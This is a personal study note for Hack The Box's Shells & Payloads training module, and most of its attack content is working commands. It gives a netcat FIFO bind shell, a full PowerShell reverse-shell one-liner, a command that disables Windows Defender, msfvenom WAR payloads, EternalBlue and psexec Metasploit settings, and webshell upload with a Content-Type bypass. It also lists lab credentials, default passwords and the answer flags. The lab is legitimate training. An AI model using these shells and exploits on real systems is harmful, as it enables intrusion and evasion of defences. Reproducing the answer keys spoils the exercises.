# Shells & Payloads (HTB Supplementary)

#ShellsAndPayloads #BindShell #ReverseShell #Webshell #Laudanum #Antak #PHP #ASPX #Meterpreter #msfvenom #EternalBlue #Tomcat #WAR #ContentTypeBypass #HTBSupplementary

**HTB Shells & Payloads module** — supplementary to Offsec shell and payload content scattered across Client-Side Attacks, Antivirus Evasion, Common Web Application Attacks, and the Shells & Payloads Command Appendix. This note captures what the Offsec modules don't cover as standalone sections: bind shell FIFO pattern, full PowerShell reverse shell one-liner, Laudanum/Antak ASPX webshell workflow, Tomcat WAR file delivery, PHP Content-Type bypass, and the multi-host live engagement chain.

> 🔁 Cross-refs: [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1 file upload attacks]], [[Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2 PS injection]], [[Client-Side Attacks#11.3.3. Staged Payload|11.3.3 download cradle]], [[Shells & Payloads]] (Command Appendix), [[Vulnerability Scanning#7.2.4. Analyzing the Results|MS17-010 in Nessus results]]

---

## SP.1. Anatomy of a Shell

A **shell** is a program that exposes OS services through a command-line interface. Two types matter here:

- **Interactive**: gives you a prompt, processes input line by line. What you get from SSH, RDP terminal, or a working reverse shell.
- **Non-interactive**: runs a command and exits. Cronjobs, scheduled tasks, web server execution contexts.

Most initial access paths (web shells, file upload RCE, log poisoning) land you a non-interactive shell. The immediate goal is usually to upgrade it to interactive.

**PSVersionTable** — check PowerShell version and edition on any host:
```powershell
# Launch PowerShell on Linux/Kali
pwsh

# Check version info
$PSVersionTable

# Extract just the edition (Core = cross-platform PS7+; Desktop = Windows-only PS5)
$PSVersionTable.PSEdition
```
On Kali, PowerShell 7 runs as `Core` edition. On Windows boxes, older PowerShell 5 shows `Desktop`. The edition tells you what features/modules are available.

#### Tags: #Shell #PSVersionTable #PowerShell #Interactive #NonInteractive

---

## SP.2. Bind Shells

A **bind shell** is where the target opens a listening port on itself and waits for the attacker to connect to it. The target is the server; the attacker connects in. Opposite direction from a reverse shell.

```
Attacker (Kali) ────connect to:PORT────→ Target (listener)
```

**Useful when:** a firewall on the target allows inbound connections (rare on modern infrastructure), or you need a persistent backdoor on a network you control.

**Setting up a bind shell on Linux (FIFO named pipe method):**
```bash
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP PORT > /tmp/f
```

What each part does:
- `rm -f /tmp/f` — clear any stale named pipe
- `mkfifo /tmp/f` — create a named pipe (FIFO = First In First Out, a special file that blocks until both ends are open)
- `cat /tmp/f` — reads bytes from the pipe and passes them to...
- `| /bin/bash -i 2>&1` — ...an interactive bash shell (stderr redirected to stdout so error messages appear in your session)
- `| nc -l TARGET_IP PORT > /tmp/f` — netcat listening on PORT, output piped back into /tmp/f (creating the input loop)

This creates a bidirectional shell over a single TCP connection: your commands go in through nc → bash runs them → output goes back through nc.

> 📸 Screenshot: nc listener started on target showing the waiting state, then attacker side showing shell prompt after connecting

**Connecting from Kali:**
```bash
nc -nv TARGET_IP PORT
# -n = no DNS, -v = verbose (shows connection status)
# Wait for "open" then you have a shell
```

> 🔧 Technique: bind shells leave an open port on the target. That port is visible in `netstat -tlnp` and will show up in any subsequent Nmap scan. On a real engagement, clean up the listener and the FIFO pipe when done.

> 🔁 Similar to: [[Port Redirection and SSH Tunneling#19.2.2|19.2.2]] uses the same FIFO pipe pattern for port forwarding rather than an interactive shell. The mechanics are identical.

#### Tags: #BindShell #mkfifo #FIFO #Netcat #NamedPipe

---

## SP.3. Reverse Shells

A **reverse shell** is where the target connects back to the attacker's listener. The attacker is the server; the target initiates. Almost always preferred over bind shells because:
- Outbound connections are far less likely to be blocked than inbound
- No new open port appears on the target during the initial session

```
Attacker (Kali listener) ←────connects back────── Target (client)
```

**nc listener on Kali (start this first):**
```bash
sudo nc -lvnp 443         # port 443 is often allowed outbound through firewalls
# -l = listen, -v = verbose, -n = no DNS, -p = port
```

**PowerShell full reverse shell one-liner (run on the Windows target):**
```powershell
PowerShell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Flags: `-nop` = no profile (faster startup, removes some detection hooks). `-c` = command string.

**If Windows Defender blocks the above** (error: "This script contains malicious content and has been blocked"):
```powershell
# Open PowerShell as Administrator first, then:
Set-MpPreference -DisableRealtimeMonitoring $true
```
Disables Defender's real-time protection for the current boot. Requires admin privileges. On a real engagement, this is loud — logs to Windows Event Log.

> 📸 Screenshot: nc listener on Kali receiving the reverse shell callback with PS prompt visible; if applicable, the "malicious content blocked" error and the Defender disable step

> 🔍 Worth remembering generally: port 443 (HTTPS) is the most permissive outbound port on corporate networks. When a reverse shell on a non-standard port fails, try 443 or 80. Also try 53 (DNS) if both of those are blocked too.

> 🔁 Similar to: [[Common Web Application Attacks]] and [[SQL Injection Attacks]] use this same PS one-liner for reverse shells from web RCE. [[Client-Side Attacks]] delivers it via VBA macro or `.lnk` shortcut instead of manually typing it.

#### Tags: #ReverseShell #PowerShell #TCPClient #WindowsDefender #SetMpPreference

---

## SP.4. Automating Payloads with Metasploit

**MSF exploit/windows/smb/psexec** — authenticate with known credentials and get a Meterpreter shell via PSExec:
```bash
msfconsole -q
use exploit/windows/smb/psexec

set RHOSTS TARGET_IP
set SHARE ADMIN$          # default; ADMIN$ is always present on Windows
set SMBUser htb-student
set SMBPass HTB_@cademy_stdnt!
set LHOST KALI_IP
exploit
```

This uses legitimate SMB credentials to authenticate and copy a service binary to the target, then start it. The shell type is determined by the selected payload (default: `windows/meterpreter/reverse_tcp`). The Meterpreter lands as a PowerShell process.

**Checking files in Meterpreter:**
```bash
ls C:/Users/htb-student/Documents/    # note forward slashes work in meterpreter
cat C:/flag.txt
```

> 🔧 Technique: the default payload `windows/meterpreter/reverse_tcp` connects back on port 4444. If a firewall blocks that, change to port 443: `set LPORT 443`.

> 🔁 Similar to: [[Password Attacks#16.3 Pass-the-Hash|16.3 PtH]] uses `impacket-psexec` for the same pattern (authenticated lateral movement via SMB). MSF psexec module uses a Meterpreter payload instead of a direct shell.

#### Tags: #Metasploit #psexec #SMB #Meterpreter #AuthenticatedExploit

---

## SP.5. Infiltrating Windows

**Payload types to know:**

| Extension | Type | Notes |
|-----------|------|-------|
| `.exe` | PE executable | Most common. `msfvenom -f exe` |
| `.dll` | Dynamic-link library | For DLL hijacking/injection |
| `.bat` | Text-based DOS batch script | CLI commands, no compilation needed |
| `.vbs` | VBScript | Scriptable automation; used in macros |
| `.ps1` | PowerShell script | Execution policy bypass often needed |
| `.war` | Web Application Archive | Java/Tomcat — see SP.9 |
| `.hta` | HTML Application | MSHTA.exe executes directly |

**MS17-010 / EternalBlue (CVE-2017-0144)** — Shadow Brokers NSA leak, 2017. Targets the Windows SMB implementation. Covered in Vulnerability Scanning related boxes. MSF module:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_psexec

set RHOSTS TARGET_IP
set LHOST KALI_IP
exploit
```

Gives `NT AUTHORITY\SYSTEM` directly. No credentials needed. Affects Windows XP through Server 2016 (unpatched).

> 🔧 Technique: `ms17_010_psexec` is the more reliable variant vs `ms17_010_eternalblue` (the raw exploit). The psexec variant uses the exploit to gain access but then uses PSExec for stable shell delivery, giving a more stable Meterpreter session.

> 🔁 Similar to: [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4]] where Nessus flags this CVE. [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]] uses `smb-vuln-ms17-010.nse` to detect it. The box [[Fixing Exploits]] does a manual EternalBlue without Metasploit.

#### Tags: #Windows #PayloadTypes #EternalBlue #MS17010 #ShadowBrokers #SYSTEMShell

---

## SP.6. Infiltrating Unix/Linux

**rConfig 3.9.6 RCE** (CVE-2019-19585 / EDB-47433) — authenticated file upload leading to RCE via a PHP reverse shell upload in the Vendors section.

MSF module: `exploit/linux/http/rconfig_vendors_auth_file_upload_rce`

```bash
msfconsole -q
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

set RHOSTS TARGET_IP
set LHOST KALI_IP
set SRVHOST KALI_IP        # where MSF hosts the payload for the target to download
exploit
# Default creds admin:admin work on default installs
```

The uploaded shell is a PHP file. Default payload: `php/meterpreter/reverse_tcp`.

> 🔍 Worth remembering generally: rconfig is a network device configuration management tool. Its presence on a network likely means it has stored credentials for routers and switches. After getting a shell, always check the database for device credentials.

```bash
# After getting Meterpreter, read device files
cd /devicedetails
cat hostnameinfo.txt    # or ls to find what's there
```

#### Tags: #Linux #rConfig #PHP #Meterpreter #PHPrce #NetworkDevice

---

## SP.7. Laudanum Webshell (ASPX)

**Laudanum** is a collection of pre-built injectable webshells in multiple languages (ASP, ASPX, CFM, JSP, PHP). Ships with Kali at `/usr/share/laudanum/`.

```bash
ls /usr/share/laudanum/
# aspx/  cfm/  jsp/  php/  etc.

# The ASPX shell
ls /usr/share/laudanum/aspx/
# shell.aspx
```

**Workflow for uploading the ASPX shell to a Windows IIS target:**

**Step 1: Copy the shell to your working directory**
```bash
cp /usr/share/laudanum/aspx/shell.aspx ./
```

**Step 2: Edit the allowed IP list** (line 59 in the file)
```bash
# Open in a text editor and find the allowedIPs section
# Add your KALI_IP to the list of permitted addresses
# Without this, the shell will refuse your connections
```

**Step 3: Add the target to /etc/hosts** (if using a vhost)
```bash
sudo bash -c 'echo "TARGET_IP status.inlanefreight.local" >> /etc/hosts'
```

**Step 4: Upload via the target's file upload interface**
Browse to the web app, find the file upload functionality, upload `shell.aspx`.

**Step 5: Navigate to the uploaded shell and run commands**
```
http://status.inlanefreight.local/files/shell.aspx
```
Enter commands in the web form. The current directory is typically `c:\windows\system32\inetsrv` (IIS working directory).

> 📸 Screenshot: Laudanum shell.aspx UI showing the command input box and the `dir` output confirming `c:\windows\system32\inetsrv` as the working directory

> 🔍 Worth remembering generally: the IIS working directory for most web app pools is `c:\windows\system32\inetsrv`. This isn't the web root — navigate explicitly to `C:\inetpub\wwwroot\` or whatever the app root is to find web files.

> 🔁 Similar to: [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] uses `/usr/share/webshells/aspx/cmdasp.aspx` (same idea, different shell). Laudanum is more feature-rich.

#### Tags: #Laudanum #ASPX #Webshell #IIS #FileUpload #Inetsrv

---

## SP.8. Antak Webshell (Nishang ASPX)

**Antak** is part of the Nishang PowerShell framework. More capable than Laudanum's ASPX shell: includes file upload/download functionality, encoded command execution, and a PowerShell-centric interface.

```bash
# Location on Kali
/usr/share/nishang/Antak-WebShell/antak.aspx

# Or find it with locate
locate antak
```

**Default credentials in the shell:** `Disclaimer` / `ForLegitUseOnly` (change these before uploading to avoid someone else accessing your shell during a pentest)

**Workflow:**

**Step 1: Copy to working directory**
```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx ./
```

**Step 2: (Optional) Edit credentials**
Open in a text editor. Find the default username/password strings and replace them.

**Step 3: Upload to the target** (same file upload as Laudanum)

**Step 4: Navigate to the shell and authenticate**
```
http://status.inlanefreight.local/files/antak.aspx
```
Enter the credentials at the login form.

**Step 5: Run commands**
`whoami` will show which user the IIS app pool is running as (typically `iis apppool\POOLNAME`).

> 📸 Screenshot: Antak webshell login page; then the command interface with `whoami` output showing `iis apppool\status`

> 🔍 Worth remembering generally: the IIS app pool user format is `iis apppool\POOLNAME` where POOLNAME matches the application pool name. This account typically has SeImpersonatePrivilege, making it a prime target for Potato-family token impersonation escalation to SYSTEM.

> 🔧 Technique: unlike Laudanum, Antak doesn't need an IP allowlist edit before use. But always change the default credentials before uploading, the default creds are public knowledge.

> 🔁 Similar to: [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] (cmdasp.aspx on IIS), [[Windows Privilege Escalation#17.3.2|17.3.2]] (IIS running as LocalSystem → SeImpersonate → SigmaPotato)

#### Tags: #Antak #Nishang #ASPX #Webshell #IIS #AppPool #SeImpersonatePrivilege

---

## SP.9. PHP Webshells and Content-Type Bypass

When a file upload form validates file type via the `Content-Type` header (rather than actual file content), changing the Content-Type in the intercepted request bypasses the check.

**Common bypass:** upload a `.php` shell but change the `Content-Type` from `application/x-php` to `image/gif` in Burp Suite.

**Setup:**
```bash
# Clone wwwolf's PHP webshell (more capable than the basic Kali built-ins)
git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git

# Alternatively, use the built-in Kali PHP shells
ls /usr/share/webshells/php/
# simple-backdoor.php, php-reverse-shell.php
```

**Intercept and modify with Burp Suite:**
1. Configure browser proxy to Burp (127.0.0.1:8080)
2. Upload the PHP shell via the target's upload form
3. Intercept the request in Burp Proxy
4. Change `Content-Type: application/x-php` to `Content-Type: image/gif`
5. Forward the modified request

**After upload — access the shell:**
- Right-click the vendor icon (in rConfig's Vendors section) → "Open Image in New Tab"
- The browser opens the PHP file as if it were an image; PHP executes and shows the webshell interface
- Run `ls` to list the current directory and find files like `ajax-loader.gif` in `/images/vendor/`

> 📸 Screenshot: Burp intercept showing the Content-Type change from `application/x-php` to `image/gif`; then the wwwolf webshell interface in browser with `ls` output

> 🔍 Worth remembering generally: Content-Type validation alone is not a real security control. It only checks what the client claims the file is, not what it actually contains. Proper validation checks file magic bytes (the actual binary header of the file) and runs the file through a real parser. Content-Type bypass works against lazy validation everywhere you find it.

> 🔧 Technique: if the target validates both Content-Type AND file extension, you need both bypasses: rename the file to `shell.php.gif` (or use a null byte if PHP is old enough: `shell.php%00.gif`), AND change Content-Type.

> 🔁 Similar to: [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] covers the full file upload bypass methodology including extension case-swapping (`pHp`). Content-Type bypass is one layer of the same attack surface.

#### Tags: #PHPWebshell #ContentTypeBypass #BurpSuite #FileUpload #wwwolf #ImageGif

---

## SP.10. Tomcat WAR File Delivery

**Apache Tomcat Manager** (typically on port 8080) allows authenticated users to deploy `.war` (Web Application Archive) files. A malicious WAR file containing a JSP reverse shell is a reliable code execution path whenever Tomcat Manager is accessible with credentials.

**Step 1: Generate the WAR payload with msfvenom**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI_IP LPORT=PORT -f war -o shell.war
```
`-f war` = WAR archive format. The payload is a JSP reverse shell that connects back to KALI_IP:PORT.

**Step 2: Start a listener**
```bash
nc -nvlp PORT
```

**Step 3: Upload and deploy via Tomcat Manager**
1. Browse to `http://TARGET:8080`
2. Click "Manager App" → authenticate with Tomcat credentials
3. Scroll to "WAR file to deploy" section → Choose file → `shell.war` → Deploy
4. The deployed app appears in the Applications list as `/shell` (or whatever you named the file)

**Step 4: Trigger the payload**
Click the deployed app name in the Applications table. This executes the JSP, which connects back to your listener.

> 📸 Screenshot: Tomcat Manager showing the uploaded WAR app in the list + nc listener on Kali showing the incoming connection

> 🔧 Technique: when you're already inside a network (e.g. operating from a jump host), set LHOST to the internal IP of your jump host, not your external Kali IP. The target can only reach your listener if it's on a reachable interface.

```bash
# Find the right internal interface IP from within a jump host
ip a | grep "172.16.1."      # or whatever the internal subnet is
```

> 🔍 Worth remembering generally: Tomcat Manager default credentials worth trying: `tomcat:tomcat`, `admin:admin`, `admin:s3cr3t`, `manager:manager`. On older installs, `tomcat:tomcat` is genuine. HTB often uses `tomcat:Tomcatadm` or similar hinted creds.

> 🔁 Similar to: [[Common Web Application Attacks#9.3.2|9.3.2]] covers IIS file upload execution. Tomcat WAR is the Java/Linux/Windows equivalent — same upload-to-execute pattern, different stack.

#### Tags: #Tomcat #WAR #msfvenom #JSP #JavaShell #TomcatManager

---

## SP.11. Live Engagement — Multi-Host Chain

The live engagement is a simulated internal network with three hosts reachable from a jump host (accessed via RDP). Methodology: enumerate each host, select the appropriate exploit, deliver via the jump host's IP as LHOST.

**Network layout:**
```
Internet ──→ Jump Host (172.16.1.5) ──→ Host-1: 172.16.1.11 (shells-winsvr, Tomcat :8080)
                                    ──→ Host-2: 172.16.1.12 (blog.inlanefreight.local, Ubuntu, PHP blog)
                                    ──→ Host-3: 172.16.1.13 (shells-winblue, Windows EternalBlue)
```

**Jump host setup:** access via `xfreerdp /v:TARGET /u:htb-student /p:"HTB_@cademy_stdnt!"`. The jump host already has `/etc/hosts` entries mapping vhost names to internal IPs.

**General pattern for all three hosts:**
1. Nmap from jump host: `nmap -A TARGET_IP` — identify services and OS
2. Choose the right exploit/shell path based on findings
3. Set LHOST to the jump host's internal IP (not Kali's external IP): `ip a | grep "172.16.1"`
4. Start listener on jump host, trigger exploit, catch shell

---

**Host-1 (shells-winsvr, 172.16.1.11) — Tomcat WAR:**
- Nmap shows port 8080 (Apache Tomcat 10.0.11)
- Creds: `tomcat:Tomcatadm` (from the module hint)
- Payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o shell.war`
- Deploy via Manager App → click app → shell
- Flag: list `C:\Shares\` → finds `dev-share` folder

---

**Host-2 (blog.inlanefreight.local, 172.16.1.12) — PHP Blog RCE:**
- Nmap shows port 80, Apache 2.4.41 on Ubuntu
- App: Lightweight facebook-styled blog 1.3 → vulnerable to authenticated RCE (EDB-50064)
- Creds: `admin:admin123!@#` (module hint)
- MSF: `use 50064.rb`, set VHOST/RHOSTS/RHOST/USERNAME/PASSWORD, exploit
- Gets PHP Meterpreter bind shell (`php/meterpreter/bind_tcp`)
- Flag: `cat /customscripts/flag.txt` → `B1nD_Shells_r_cool`

---

**Host-3 (shells-winblue, 172.16.1.13) — EternalBlue:**
- Nmap shows SMB 445, Windows Server 2016 Standard, hostname shells-winblue
- MSF: `use exploit/windows/smb/ms17_010_psexec`, set RHOSTS/LHOST
- Gets `NT AUTHORITY\SYSTEM` Meterpreter
- Flag: `cat C:/Users/Administrator/Desktop/Skills-flag.txt` → `One-H0st-Down!`

---

**Live Engagement answers:**

| Question | Answer |
|---|---|
| Hostname of Host-1? | **shells-winsvr** (from Nmap RDP SSL cert CN) |
| Folder in C:\Shares\ on Host-1? | **dev-share** (Tomcat WAR shell → dir C:\Shares\) |
| Linux distro on Host-2? | **ubuntu** (from SSH banner in Nmap: `OpenSSH 8.2p1 Ubuntu 4ubuntu0.3`) |
| Shell language in 50064.rb exploit? | **php** (searchsploit shows `php/webapps/50064.rb`) |
| Flag at /customscripts/flag.txt (Host-2)? | **B1nD_Shells_r_cool** |
| Hostname of Host-3? | **shells-winblue** (Nmap NBT name + smb-os-discovery) |
| C:\Users\Administrator\Desktop\Skills-flag.txt (Host-3)? | **One-H0st-Down!** |

> 🔍 Worth remembering generally: when working from a pivot/jump host, the LHOST for any callback shell must be the jump host's IP on the internal network, not your external attack box IP. The targets can only reach the jump host, not your external Kali. Use `ip a | grep INTERNAL_SUBNET` to find the right interface.

#### Tags: #LiveEngagement #MultiHost #JumpHost #Pivot #Tomcat #EternalBlue #PHPBlog

---

## SP.12. All Section Q&A Answers

| Section | Question | Answer |
|---|---|---|
| Anatomy of a Shell | Two shell languages used? | **bash&powershell** |
| Anatomy of a Shell | PSEdition of PowerShell on Pwnbox? | **Core** |
| Bind Shells | Port to connect to for `nc -lvnp 443`? | **443** |
| Bind Shells | Flag at /customscripts/flag.txt (bind shell lab)? | **B1nD_Shells_r_cool** |
| Reverse Shells | Target acts as client or server? | **client** |
| Reverse Shells | Hostname of Windows RDP target? | **SHELLS-WIN10** |
| MSF Payloads | Command language interpreter for system shell? | **powershell** |
| MSF Payloads | Filename in htb-student's Documents? | **staffsalaries.txt** |
| Infiltrating Windows | DOS script file type extension? | **.bat** |
| Infiltrating Windows | Windows exploit from Shadow Brokers leak? | **MS17-010** |
| Infiltrating Windows | Flag at C:\flag.txt (EternalBlue target)? | **EB-Still-W0rk$** |
| Infiltrating Linux | Payload language in rconfig_vendors exploit? | **php** |
| Infiltrating Linux | Hostname of router in /devicedetails? | **edgerouter-isp** |
| Laudanum | Working directory via Laudanum shell? | **c:\windows\system32\inetsrv** |
| Laudanum | Full path to Laudanum aspx shell on Pwnbox? | **/usr/share/laudanum/aspx/shell.aspx** |
| Antak | Full path to Antak webshell on Pwnbox? | **/usr/share/nishang/Antak-WebShell/antak.aspx** |
| Antak | User running commands via Antak shell? | **iis apppool\status** |
| PHP Web Shells | Content-Type for bypass? | **image/gif** |
| PHP Web Shells | GIF filename in /images/vendor directory? | **ajax-loader.gif** |

---

## Outstanding Sections

- [x] SP.1. Anatomy of a Shell (PSVersionTable, PSEdition)
- [x] SP.2. Bind Shells (FIFO bind shell, nc connect)
- [x] SP.3. Reverse Shells (PS one-liner, Defender disable)
- [x] SP.4. MSF psexec with credentials
- [x] SP.5. Infiltrating Windows (payload types, EternalBlue MSF)
- [x] SP.6. Infiltrating Unix/Linux (rConfig PHP RCE)
- [x] SP.7. Laudanum ASPX webshell
- [x] SP.8. Antak webshell (Nishang)
- [x] SP.9. PHP webshell Content-Type bypass
- [x] SP.10. Tomcat WAR file delivery
- [x] SP.11. Live Engagement multi-host chain
- [x] SP.12. All Q&A answers
- All hands-on labs completed — no Offsec VM required (HTB spawnable targets only)

---

## Related Boxes

- **[Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)** (HTB, Windows, Easy): MS17-010 EternalBlue. Direct practice of SP.5 and SP.11 Host-3 chain.
- **[Jerry](https://0xdf.gitlab.io/2019/02/21/htb-jerry.html)** (HTB, Windows, Easy): Apache Tomcat Manager WAR file deployment → SYSTEM. Textbook SP.10 practice.
- **[Grandpa](https://www.hackthebox.com/machines/grandpa)** (HTB, Windows, Easy): IIS 6.0 WebDAV buffer overflow. Similar "old Windows service → SYSTEM" chain to SP.5.
- **[Bashed](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)** (HTB, Linux, Easy): web shell already planted on the server (phpbash) → upgrade to reverse shell. Practice SP.6/SP.9 style thinking.
